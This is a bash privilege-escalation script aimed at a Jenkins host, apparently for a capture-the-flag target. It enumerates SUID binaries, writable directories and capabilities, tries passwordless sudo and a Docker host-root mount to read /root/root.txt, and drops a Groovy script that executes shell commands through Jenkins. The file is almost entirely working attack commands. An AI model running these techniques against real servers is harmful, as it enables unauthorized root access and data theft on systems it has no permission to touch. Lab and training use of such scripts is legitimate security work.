#!/bin/bash

# Privilege Escalation Script for Jenkins

# Display system information
echo "[+] System Information:"
id
uname -a
hostname

# Try various privilege escalation techniques
echo "[+] Checking for SUID binaries..."
find / -perm -4000 -type f 2>/dev/null

echo "[+] Checking for writable directories..."
find / -writable -type d 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | grep -v "^/dev"

echo "[+] Checking for capabilities..."
getcap -r / 2>/dev/null

# Try to read the flag directly
echo "[+] Attempting to read flag..."
cat /root/root.txt 2>/dev/null
cat /root/flag.txt 2>/dev/null
cat /flag 2>/dev/null

# Try to exploit Jenkins-specific vulnerabilities
echo "[+] Checking for Jenkins vulnerabilities..."

# Try to use Jenkins to run as root via sudo
echo "[+] Trying sudo without password..."
sudo cat /root/root.txt 2>/dev/null

# Try to exploit Docker if available
echo "[+] Checking for Docker..."
if command -v docker &> /dev/null; then
    echo "Docker found, attempting to exploit..."
    docker run -v /:/mnt alpine cat /mnt/root/root.txt 2>/dev/null
fi

# Try to exploit Jenkins script capabilities
echo "[+] Creating Jenkins privilege escalation script..."
cat > /tmp/jenkins_privesc.groovy << 'EOL'
import jenkins.model.Jenkins
import hudson.model.User
import hudson.security.ACL
import hudson.security.Permission

// Try to modify permissions
try {
    def jenkins = Jenkins.getInstance()
    def strategy = jenkins.getAuthorizationStrategy()
    println("Authorization Strategy: " + strategy.getClass().getName())
} catch (Exception e) {
    println("Error: " + e.getMessage())
}

// Try to read the flag using Jenkins permissions
try {
    def proc = "cat /root/root.txt".execute()
    println("Flag: " + proc.text)
} catch (Exception e) {
    println("Error reading flag: " + e.getMessage())
}
EOL

echo "[+] Done. Check for any successful privilege escalation."
